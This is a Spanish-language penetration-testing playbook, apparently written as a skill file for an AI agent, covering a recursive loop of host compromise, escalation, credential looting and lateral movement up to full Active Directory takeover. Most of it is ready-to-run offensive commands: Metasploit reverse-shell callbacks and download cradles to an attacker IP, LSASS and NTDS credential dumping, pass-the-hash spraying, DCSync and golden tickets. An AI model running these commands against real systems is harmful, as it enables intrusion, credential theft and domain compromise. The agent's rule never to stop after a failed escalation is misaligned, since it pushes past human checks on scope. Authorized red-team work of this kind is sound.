# Escalada, Control Remoto y Movimiento Lateral — Bucle Recursivo

El corazón de un engagement interno: NINGUN acceso es el final. Cada host compromise =
nuevas credenciales + nueva red visible + nuevos objetivos. Se repite el bucle hasta el
objetivo del alcance (DA, root de X, datos) o hasta agotar la autorización.
Todo dentro de lo autorizado (§0 de SKILL.md); cada paso se documenta en `notes.md`.

## 0. El bucle (memorizarlo entero)

```
ACCESO  (shell / cred / ticket / hash)
  └→ ENUMERAR el gain: whoami, grupos, privilegios, red del host (ip a), sesiones activas,
     credenciales en cache, que VE este host que Kali no veia (segmentos nuevos, servidores)
      └→ ESCALAR local (→ SYSTEM/root)              → §2 / §3
           └→ LOOT credenciales                     → §4
                └→ MATCH: ¿cada cred nueva abre QUE hosts/servicios?  → §5
                     └→ MOVER (psexec/winrm/ssh/PtH/RDP) → §1
                          └→ (nuevo host) → vuelve a ENUMERAR...
Hasta: objetivo alcanzado | authorized scope agotado | riesgo de deteccion excesivo (avisar al usuario)
```

Reglas del bucle:
- Tras CADA éxito, responder en voz alta: "¿que credenciales/redes/hosts NUEVOS tengo ahora?"
- Un portador de credenciales viejo (host A) sigue siendo válido: no lo abandones, úsalo como
  base de operaciones para atacar desde su identidad.
- Si dos rutas se abren, priorizar la que de mas privilegios por menos ruido (AD > linux suelto > app).
- Al escalar, NUNCA asumir que el host siguiente está en la misma red: `ip route` en cada gain.

## 1. Control remoto de un host conseguido

### Sesión interactiva por protocolo (según lo que de el target)
```bash
netexec smb  10.10.20.5 -u u -p 'p' -x 'whoami'          # psexec (SMB/RPC)
netexec wmi  10.10.20.5 -u u -p 'p' -x 'whoami'          # WMI, sin smbexec, menos ruidoso
impacket-wmiexec -hashes :<NT> corp/u@10.10.20.5          # shell semi-interactiva
impacket-psexec / impacket-atexec ...                     # equivalentes
evil-winrm -i 10.10.20.5 -u u -p 'p'                      # WinRM (5985): shell completa + upload/download
impacket-smbclient -u u -p 'p' //10.10.20.5/C$           # filesystem como sesión
ssh key@10.10.20.5                                        # SSH con key robada (§4)
xfreerdp /u:u /p:'p' /v:10.10.20.5 /cert:ignore /dynamic-resolution  # escritorio
```

### Shell persistente con callback (cuando el target tiene egress hacia Kali)
```bash
# Listener (en tmux):
sudo msfconsole -q -x 'use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -j -z'
# Oneliner para ejecutar en el target via -x/evil-winrm (autorizado):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-downloadcradle -o $BASE/evidence/cradle.txt
# Meterpreter da todo lo operativo: sysinfo, screenshot, keyscan_start, hashdump,
# portfwd/add, migrate,Background, search, load kiwi (si el binario lo permite)
```

### Cuando NO hay egress desde el target → túnel desde Kali hacia dentro (ver §6)

### Upgrade de shells rotas (clasico)
```bash
# shell con python: python3 -c 'import pty; pty.spawn("/bin/bash")' → Ctrl+Z → stty raw -echo; fg
# windows cmd limitado: via winrm se tiene shell real (evil-winrm) — mejor que luchar con psexec
rlwrap nc -lvnp 4445   # listener legible
```

## 2. Escalada Windows → SYSTEM (en orden de frecuencia de exito)

```bash
winPEAS.exe cmd           # subir winpeas.exe al target (scp/smbclient/evil-winrm upload)
whoami /priv              # SeImpersonatePrivilege → cualquier potato (printspoofer, juicy, godpotato...)
sc querytype= service | findstr /i "win32"   # y luego:
sc qc <servicio>          # binario con path sin comillas (C:\Program Files (x86)\... unquoted) o BINARY_PATH writable → reemplazar exe y reiniciar
reg query HKLM\...\AlwaysInstallElevated     # =1 → msi SYSTEM
# UAC bypass: fodhelper/eventvwr (si el user es admin local con UAC en modo approve)
# Token robable: procesos con "Run as" → impersonation via meterpreter incognito
```
Cada hallazgo → explotar con lo mínimo, documentar evidencia ANTES/dESPUES de escalar.

## 3. Escalada Linux → root (checklist completo sobre el anterior)

```bash
linpeas.sh ; pspy64 &     # automatizado + procesos con creds en argv
sudo -l                   # ALL? env_keep? GTFOBins del binario permitido
                          # CVEs de sudo: searchsploit sudo  -> pwnt/PoC solo con autorizacion expresa
find / -perm -4000 2>/dev/null            # SUID bins → consultar GTFOBins por CADA binario (§3 nota)
getcap -r / 2>/dev/null   # cap_setuid/cap_dac_read_search...
# writable: /etc/crontab, /etc/passwd (linea + con password vacia!), scripts cron de root editables
id                        # docker/lxd→ mount FS root; adm→ leer shadow; backup groups
mount | grep nfs          # no_root_squash = escribir binario SUID desde Kali
find / -writable -type f 2>/dev/null | grep -E '\.(conf|sh|py|json|env)$'
```
**GTFOBins es la clave:** para CADA binario SUID/capability/sudo-permitido, consultar
`https://gtfobins.com` (webfetch) — es lo que convierte `find / -perm -4000` en root.

## 4. Loot de credenciales = munición del bucle

```bash
# Windows:
pypykatz lsa minidump lsass.dmp            # offline sobre dump robado
netexec smb <h> -u u -p 'p' --lsa/--sam    # remoto; DC → --ntds via ldap
impacket-secretsdump -just-dc-user '*svc*' corp/ad@DC   # granular, menos ruido
dploot credentials/lsas/masterkeys ...      # DPAPI browsers/autologon
# Tickets Kerberos en memoria → reusar con PtT (§5); kirbis/ccaches en disco:
impacket-mimikatz ...                     # segun build instalado (verificar con --help)
# (los tickets se exportan con minikerberos-ccacheroast y se reusan con PtT §5)

# Linux:
ls -la ~/.ssh; cat /etc/shadow              # tras escalar
grep -rHiE 'passw|api.?key|token|secret' /opt /srv /var/www 2>/dev/null | head -50
env; cat ~/.bash_history; git -C /opt/app log -p | grep -iE 'pass|key'
find / -name '*.pem' -o -name 'id_rsa*' 2>/dev/null | head
# keepass/ffs/browser: tras loot, dploot/pypykatz sobre DPAPI

# Regla: CADA cred (user/pass/hash/key/ticket) pasa a la lista de intentos contra TODOS
# los hosts/servicios vivos del scope: nxc spray puntual + -H para PtH. No se descarta ninguna.
```

## 5. Movimiento lateral — matriz (lo que tengo → como lo uso → donde)

| Tengo | Contra | Comando |
|---|---|---|
| NT hash de user con acceso | SMB/WinRM/RDP | `netexec smb 10.10.20.0/24 -u u -H <NT> --local-auth -x whoami` (PtH) |
| Password valida | todos | `netexec <proto> <rango> -u u -p 'p' -x 'whoami'` |
| Key SSH / pass Linux | hosts SSH | `ssh -i id_ed25519 u@10.10.20.9` — y su hash pasa a nxc ssh |
| Kirbi/ccache (TGT/TGS) | servicios Kerberos | `impacket-getST` / minikerberos → PtT sin password |
| Admin local en un host | otros hosts | `netexec --sam` en ese host → hashes de ahi → spray |
| ACLs de replicación | dominio completo | `impacket-secretsdump corp/u:pass@DC` → NTDS completo (DCSync) |
| Grupo Remote Mgmt/WinRM | el host | `evil-winrm -i h -u u -H <NT>` |
| Cred SQL sa | MSSQL host | `netexec mssql h -u sa -p 'p' --local-auth -x 'whoami'` |

## 6. Pivoting del bucle (cuando el nuevo segmento no tiene ruta a Kali)

```bash
# Ya tenemos acceso al host A; A ve la red 10.10.30.0/24; Kali no.
# 1. SOCKS desde Kali a traves de A: asysocks-proxy, chisel R:socks o ssh -D (ver exploit-postex.md)
# 2. proxychains4 netexec/nmap/bloodhound sobre 10.10.30.0/24  → el bucle CONTINUA desde A
# 3. bloodhound-python via proxy sobre el nuevo segmento: el grafo AD se re-consulta
```

## 7. Dominio completo (objetivo tipico)

`DCSync` (NTDS de todos) → `impacket-ticketer -nthash <krbtgt>` **Golden ticket** (acceso a todo,
aun cambiandose passwords) → Silver (un servicio) → DCSync + GPO deploy si se necesita control
masivo → documentar CAMINO de ataque (host1→credsA→host2→...) — es lo mas valioso del informe.

## 8. Criterios de parada (evitar el bucle infinito sin salida)

- Objetivo del alcance cumplido → **parar y reportar el camino completo**
- Acceso ya "suficientemente bueno" pero escalar mas = mas ruido → consultar al usuario
- Mismo host/cred dando vueltas sin gain nuevo → cambiar de rama del grafo (BloodHound)
- El bucle NUNCA se detiene "porque una escalation fallo": se cambia de vector, no de objetivo.
